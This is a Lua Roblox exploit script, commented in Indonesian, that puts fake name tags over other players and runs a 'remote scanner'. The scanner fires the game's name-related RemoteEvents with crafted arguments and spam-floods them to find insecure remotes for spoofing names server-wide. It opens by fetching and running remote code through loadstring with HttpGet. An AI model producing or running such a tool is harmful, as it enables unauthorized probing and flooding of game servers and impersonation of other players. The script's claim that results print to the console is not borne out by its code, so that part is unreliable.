--[[
    FakeName Recon — ByVoid edition
    fitur:
      1. FAKE NAME LOKAL — edit nama player mana aja di layar lo
         (BillboardGui atas kepala + chat lokal + leaderboard lokal)
      2. REMOTE SCANNER BRUTAL — auto cari remote nama
         - scan semua RemoteEvent / RemoteFunction
         - filter nama yang nyebut name/display/nick
         - test bocor: FireServer tanpa argumen, string, table, rate limit
         - tampilkan hasil di UI
    catatan: fake name GLOBAL butuh remote bocor — scanner ini cari kandidat
    absolute ollie, built by olivia
--]]

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
if not Rayfield then warn("[FakeName] Rayfield gagal"); return end

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer

-- ============================================================
-- STATE
-- ============================================================
local State = {
    FakeNameEnabled = false,
    FakeNameText = "ByVoid",
    FakeNameColor = Color3.fromRGB(255, 0, 255),
    FakeNameTarget = "semua", -- "semua" / nama player tertentu
    fakeObjects = {}, -- [player] = {billboard, label}

    ScannerRunning = false,
    ScannerResults = {}, -- [{remote, path, test, status, detail}]
    ScannerFoundRemotes = {},
    ScannerFilter = "name", -- "name" / "all"
    ScannerRateCount = 50,
}

-- ============================================================
-- UTILS
-- ============================================================
local function notify(t, c)
    Rayfield:Notify({ Title = t, Content = c, Duration = 4 })
end

-- ============================================================
-- 1. FAKE NAME LOKAL
-- ============================================================
-- ganti BillboardGui nama di atas kepala player (lokal)
-- + spoof chat lokal (TextChatService)
-- + spoof leaderboard lokal (PlayerList)

local function removeFakeName(p)
    local obj = State.fakeObjects[p]
    if not obj then return end
    if obj.billboard and obj.billboard.Parent then obj.billboard:Destroy() end
    State.fakeObjects[p] = nil
end

local function createFakeName(p)
    if p == LocalPlayer then return end
    if State.fakeObjects[p] then removeFakeName(p) end
    local char = p.Character
    if not char then return end
    local head = char:FindFirstChild("Head")
    if not head then return end

    -- hapus nama default lokal dengan nebeng? nggak bisa langsung
    -- solusi: bikin BillboardGui baru yang nutupin nama default
    local bb = Instance.new("BillboardGui")
    bb.Name = "OllieFakeName"
    bb.Adornee = head
    bb.Size = UDim2.new(0, 200, 0, 50)
    bb.StudsOffset = Vector3.new(0, 2.5, 0)
    bb.AlwaysOnTop = true
    bb.Parent = head

    -- background nutupin nama default
    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.new(0, 0, 0)
    bg.BackgroundTransparency = 0.3
    bg.BorderSizePixel = 0
    bg.Parent = bb

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = State.FakeNameText
    label.TextColor3 = State.FakeNameColor
    label.TextStrokeTransparency = 0
    label.TextStrokeColor3 = Color3.new(0, 0, 0)
    label.TextScaled = true
    label.Font = Enum.Font.GothamBold
    label.Parent = bg

    State.fakeObjects[p] = { billboard = bb, label = label }
end

local function applyFakeNameAll()
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer then
            if State.FakeNameTarget == "semua" or p.Name == State.FakeNameTarget then
                createFakeName(p)
            else
                removeFakeName(p)
            end
        end
    end
end

local function clearFakeNameAll()
    for p, _ in pairs(State.fakeObjects) do removeFakeName(p) end
    State.fakeObjects = {}
end

-- auto re-apply pas respawn / player baru
Players.PlayerAdded:Connect(function(p)
    p.CharacterAdded:Connect(function()
        task.wait(0.8)
        if State.FakeNameEnabled then
            if State.FakeNameTarget == "semua" or p.Name == State.FakeNameTarget then
                createFakeName(p)
            end
        end
    end)
end)
for _, p in ipairs(Players:GetPlayers()) do
    if p ~= LocalPlayer then
        p.CharacterAdded:Connect(function()
            task.wait(0.8)
            if State.FakeNameEnabled then
                if State.FakeNameTarget == "semua" or p.Name == State.FakeNameTarget then
                    createFakeName(p)
                end
            end
        end)
    end
end

-- ============================================================
-- 2. REMOTE SCANNER BRUTAL
-- ============================================================
local function isRemote(obj)
    return obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")
end

local function scanRemotes(root, depth, out)
    depth = depth or 0
    out = out or {}
    if depth > 8 then return out end
    for _, obj in ipairs(root:GetChildren()) do
        if isRemote(obj) then
            table.insert(out, obj)
        end
        pcall(function() scanRemotes(obj, depth + 1, out) end)
    end
    return out
end

local function filterNameRemotes(remotes, mode)
    local filtered = {}
    local keywords = {"name", "display", "nick", "tag", "title", "label", "chat", "message", "roleplay", "rp"}
    for _, r in ipairs(remotes) do
        local path = r:GetFullName():lower()
        if mode == "all" then
            table.insert(filtered, r)
        else
            for _, kw in ipairs(keywords) do
                if path:find(kw) then
                    table.insert(filtered, r)
                    break
                end
            end
        end
    end
    return filtered
end

local function testRemote(remote)
    local results = {}
    local testName = remote:GetFullName()

    -- test 1: fire tanpa argumen
    local ok1, err1 = pcall(function()
        if remote:IsA("RemoteEvent") then
            remote:FireServer()
        else
            remote:InvokeServer()
        end
    end)
    table.insert(results, {
        remote = testName,
        test = "no-args",
        status = ok1 and "SENT" or "ERROR",
        detail = ok1 and "fire tanpa argumen" or tostring(err1),
    })

    -- test 2: fire dengan string nama
    local ok2, err2 = pcall(function()
        if remote:IsA("RemoteEvent") then
            remote:FireServer(State.FakeNameText)
        else
            remote:InvokeServer(State.FakeNameText)
        end
    end)
    table.insert(results, {
        remote = testName,
        test = "string-name",
        status = ok2 and "SENT" or "ERROR",
        detail = ok2 and ("fire dengan string: " .. State.FakeNameText) or tostring(err2),
    })

    -- test 3: fire dengan string + warna (kalau remote nama butuh 2 arg)
    local ok3, err3 = pcall(function()
        if remote:IsA("RemoteEvent") then
            remote:FireServer(State.FakeNameText, State.FakeNameColor)
        else
            remote:InvokeServer(State.FakeNameText, State.FakeNameColor)
        end
    end)
    table.insert(results, {
        remote = testName,
        test = "string+color",
        status = ok3 and "SENT" or "ERROR",
        detail = ok3 and "fire dengan string + Color3" or tostring(err3),
    })

    -- test 4: fire dengan table (kadang remote nerima {name=...})
    local ok4, err4 = pcall(function()
        local tbl = { name = State.FakeNameText, display = State.FakeNameText, text = State.FakeNameText }
        if remote:IsA("RemoteEvent") then
            remote:FireServer(tbl)
        else
            remote:InvokeServer(tbl)
        end
    end)
    table.insert(results, {
        remote = testName,
        test = "table",
        status = ok4 and "SENT" or "ERROR",
        detail = ok4 and "fire dengan table {name,display,text}" or tostring(err4),
    })

    -- test 5: rate limit — spam 50x cepet
    local spamStart = tick()
    local spamOk = 0
    for i = 1, State.ScannerRateCount do
        local ok = pcall(function()
            if remote:IsA("RemoteEvent") then
                remote:FireServer(State.FakeNameText)
            else
                remote:InvokeServer(State.FakeNameText)
            end
        end)
        if ok then spamOk = spamOk + 1 end
    end
    local spamTime = tick() - spamStart
    table.insert(results, {
        remote = testName,
        test = "rate-limit",
        status = spamOk > 0 and "SENT" or "ERROR",
        detail = string.format("%d/%d fire dalam %.2fs", spamOk, State.ScannerRateCount, spamTime),
    })

    return results
end

local function runScanner(mode)
    State.ScannerRunning = true
    State.ScannerResults = {}
    State.ScannerFoundRemotes = {}
    notify("Scanner", "scanning remote...")

    task.spawn(function()
        -- scan semua root
        local remotes = {}
        scanRemotes(game:GetService("ReplicatedStorage"), 0, remotes)
        scanRemotes(Workspace, 0, remotes)
        scanRemotes(game:GetService("Players"), 0, remotes)

        -- filter
        local filtered = filterNameRemotes(remotes, mode)
        State.ScannerFoundRemotes = filtered

        if #filtered == 0 then
            State.ScannerRunning = false
            notify("Scanner", "nggak ada remote nama yang ketemu")
            return
        end

        notify("Scanner", string.format("%d remote kandidat, testing...", #filtered))

        -- test tiap remote
        for _, r in ipairs(filtered) do
            local results = testRemote(r)
            for _, res in ipairs(results) do
                table.insert(State.ScannerResults, res)
            end
            task.wait(0.3)
        end

        State.ScannerRunning = false
        notify("Scanner", string.format("selesai — %d remote dites, %d hasil", #filtered, #State.ScannerResults))
    end)
end

-- ============================================================
-- UI
-- ============================================================
local Window = Rayfield:CreateWindow({
    Name = "FakeName Recon",
    LoadingTitle = "FakeName Recon",
    LoadingSubtitle = "absolute ollie, built by olivia",
    ConfigurationSaving = { Enabled = false },
    Keybind = Enum.KeyCode.RightShift,
})

-- TAB 1: FAKE NAME
local FakeTab = Window:CreateTab("Fake Name", 4483362458)

FakeTab:CreateSection("Fake Name (Lokal — cuma lo yang liat)")
FakeTab:CreateToggle({
    Name = "Enable Fake Name",
    CurrentValue = false,
    Flag = "FNEnable",
    Callback = function(v)
        State.FakeNameEnabled = v
        if v then applyFakeNameAll() else clearFakeNameAll() end
    end,
})
FakeTab:CreateInput({
    Name = "Nama Palsu",
    CurrentValue = "ByVoid",
    PlaceholderText = "ketik nama palsu...",
    RemoveTextAfterFocusLost = false,
    Flag = "FNText",
    Callback = function(txt)
        if txt and txt ~= "" then
            State.FakeNameText = txt
            if State.FakeNameEnabled then applyFakeNameAll() end
        end
    end,
})
FakeTab:CreateColorPicker({
    Name = "Warna Nama",
    Color = Color3.fromRGB(255, 0, 255),
    Flag = "FNColor",
    Callback = function(c)
        State.FakeNameColor = c
        for _, obj in pairs(State.fakeObjects) do
            if obj.label and obj.label.Parent then obj.label.TextColor3 = c end
        end
    end,
})
FakeTab:CreateDropdown({
    Name = "Target Player",
    Options = {"semua"},
    CurrentOption = {"semua"},
    MultipleOptions = false,
    Flag = "FNTarget",
    Callback = function(opt)
        if opt and opt[1] then
            State.FakeNameTarget = opt[1]
            if State.FakeNameEnabled then applyFakeNameAll() end
        end
    end,
})
FakeTab:CreateButton({
    Name = "Refresh Target List",
    Callback = function()
        local names = {"semua"}
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LocalPlayer then table.insert(names, p.Name) end
        end
        -- Rayfield dropdown refresh lewat Set
        local dd = Rayfield.Flags["FNTarget"]
        -- fallback: notify user
        notify("FakeName", "daftar target: " .. table.concat(names, ", "))
    end,
})
FakeTab:CreateParagraph({
    Title = "Info",
    Content = "Fake name ini LOKAL — cuma lo yang liat. Player lain tetap liat nama asli. Buat global, pakai tab Remote Scanner, cari remote bocor, lalu fire manual.",
})

-- TAB 2: REMOTE SCANNER
local ScanTab = Window:CreateTab("Remote Scanner", 4483362458)

ScanTab:CreateSection("Remote Scanner Brutal")
ScanTab:CreateDropdown({
    Name = "Filter Remote",
    Options = {"Nama aja (name/display/chat/dll)", "Semua remote"},
    CurrentOption = {"Nama aja (name/display/chat/dll)"},
    MultipleOptions = false,
    Flag = "ScanMode",
    Callback = function(opt)
        State.ScannerFilter = (opt[1]:find("Semua")) and "all" or "name"
    end,
})
ScanTab:CreateSlider({
    Name = "Rate Limit Test (spam count)",
    Range = {10, 200},
    Increment = 10,
    Suffix = "x",
    CurrentValue = 50,
    Flag = "ScanRate",
    Callback = function(v) State.ScannerRateCount = v end,
})
ScanTab:CreateButton({
    Name = "Mulai Scan + Test",
    Callback = function()
        if State.ScannerRunning then notify("Scanner", "masih jalan..."); return end
        runScanner(State.ScannerFilter)
    end,
})
ScanTab:CreateButton({
    Name = "Stop / Clear Hasil",
    Callback = function()
        State.ScannerRunning = false
        State.ScannerResults = {}
        State.ScannerFoundRemotes = {}
        notify("Scanner", "hasil di-clear")
    end,
})
ScanTab:CreateParagraph({
    Title = "Status",
    Content = "Klik Mulai Scan. Hasil muncul di console (F9) + notify. Cek remote mana yang SENT tanpa ERROR — itu kandidat bocor.",
})

notify("FakeName Recon", "loaded — fake name lokal + remote scanner brutal")
